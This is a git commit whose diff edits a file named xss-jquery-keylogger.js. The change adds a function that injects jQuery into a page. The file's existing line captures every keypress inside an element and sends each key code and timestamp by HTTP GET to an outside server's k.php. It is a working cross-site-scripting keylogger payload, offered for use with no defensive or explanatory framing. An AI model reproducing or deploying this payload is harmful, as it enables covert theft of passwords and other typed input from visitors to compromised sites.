c7dc209f084ab2cce3f5bcf63f814799d84f8135
kigihan <kigihan77@gmail.com>
2019-07-03 16:46:51 +0800

    j

--- xss-jquery-keylogger.js
+++ xss-jquery-keylogger.js
@@ -1,1 +1,10 @@
+function jq(){
+	var script = document.createElement('script');
+	script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
+	script.type = 'text/javascript';
+	document.getElementsByTagName('head')[0].appendChild(script);
+}
+
+jq();
+
 $('#w').contents().keypress(function(event) {$.get('http://www.glhf.com.tw/k.php?x='+event.which+'&t='+event.timeStamp,function(data){});});
